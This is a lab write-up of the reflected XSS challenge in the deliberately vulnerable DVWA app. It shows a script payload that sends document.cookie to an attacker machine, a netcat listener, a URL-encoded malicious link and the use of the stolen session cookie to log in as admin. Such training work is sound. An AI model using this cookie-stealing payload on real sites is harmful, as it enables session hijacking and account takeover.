---
title: "DVWA: XSS Reflected (low)"
---

## Objective

One way or another, steal the cookie of a logged in user.

(Security Level: `Low`)

::: info
**It is not** a pentest report.
:::

## Information Gathering

- `PHPSESSID` - The _cookie of a logged in user_.
- `dvwa:4280` - Target Machine hosting DVWA app on port 4280
- `kali[:PORT]` - Attack Machine (Kali Linux)

I've been using the `dvwa` (Target) to locally look for the attack surface and `kali` to exploit the XSS once I've found it.

## Enumeration

The page consists of a text field (`input[type=text]`) and _Submit_ button (`input[type=submit]`).

```html
<form name="XSS" action="#" method="GET">
  <p>
    What's your name?
    <input type="text" name="name" />
    <input type="submit" value="Submit" />
  </p>
</form>
```

Submitting a form results in displaying the text field value below the form:

```html
<form name="XSS" action="#" method="GET"><!-- ... --></form>
<pre>Hello Krystian</pre>
```

The text value is reflected in the URL Query Params as well:

```
http://127.0.0.1:4280/vulnerabilities/xss_r/?name=Krystian
```

### Looking for XSS

By trying to use `<b>Krystian</b>` as the value I confirmed that HTML is reflected properly on the website.

```html
<form name="XSS" action="#" method="GET"><!-- ... --></form>
<pre>
Hello 
	<b>Krystian</b>
</pre>
```

It seems that the developer forgot to validate the text input and remove the HTML tags before reflecting its value on the website.

By using `<script>alert(1)</script>` I also confirmed that **JS provided as the input is evaluated properly**.

### Using XSS to obtain

With that in mind I should be able not only to `alert` the `PHPSESSID` but also to prepare the URL that could send it over to my very own server.

## Exploitation

::: info
For reasons unbeknownst when I logged in to DVWA the _Security Level_ was set to **_Impossible_** and reverting it back to _Low_ resulted in having a `PHPSESSID` cookie set as `HttpOnly` (which blocked me from accessing it client-side).

To remediate that I manually set the Security Level to Low, removed the `PHPSESSID` cookie leaving the `security=low` cookie. After logging back in, the `HttpOnly` flag was false.

My wild guess is that it's kind of an error/regression of DVWA's (but I might be wrong).
:::

### Obtaining the `PHPSESSID` locally

I've prepared this [[payload]] that can be evaluated through the `input[type=text]` (where IP/port are of a Kali Linux VM):

```html
<script>
  new Image().src = "http://kali:9999/test.php?output=" + document.cookie;
</script>
```

Obviously I've also started to listen on port `9999` (via [[knowledge/off-sec/tools/netcat|netcat]]) on Kali Linux:

```sh
nc -lvp 9999
```

This way I could read the `PHPSESSID` cookie locally.

```http
GET /test.php?output=security=low;%20PHPSESSID=83b48b9b9628c1cc82f8b8ad9dc67e49 HTTP/1.1
```

## Privilege Escalation

### Stealing `PHPSESSID` from another host

Since the input value is reflected in the URL Query Params, I prepared the URL with the malicious payload:

```html
http://dvwa:4280/vulnerabilities/xss_r/?name=%3Cscript%3Enew+Image().src+%3D+%22http%3A%2F%2Fkali%3A9999%2Ftest.php%3Foutput%3D%22+%2B+document.cookie%3B%3C%2Fscript%3E#
# unsecaped: http://dvwa:4280/vulnerabilities/xss_r/?name=
<script>
  new Image().src = "http://kali:9999/test.php?output" + document.cookie;
</script>
#
```

By opening this URL on the Target Machine I obtained the `PHPSESSID`.

### Using the `PHPSESSID`

Lastly, I modified said cookie on the Attack Machine and opened DVWA's root. I was logged in as an Admin.

::: danger Why not just refresh?
Once you open DVWA app without being logged in, you are redirected to `/login.php`. Even if the `PHPSESSID` is valid, it still does not redirect to `/`, so you have to do it manually.
:::
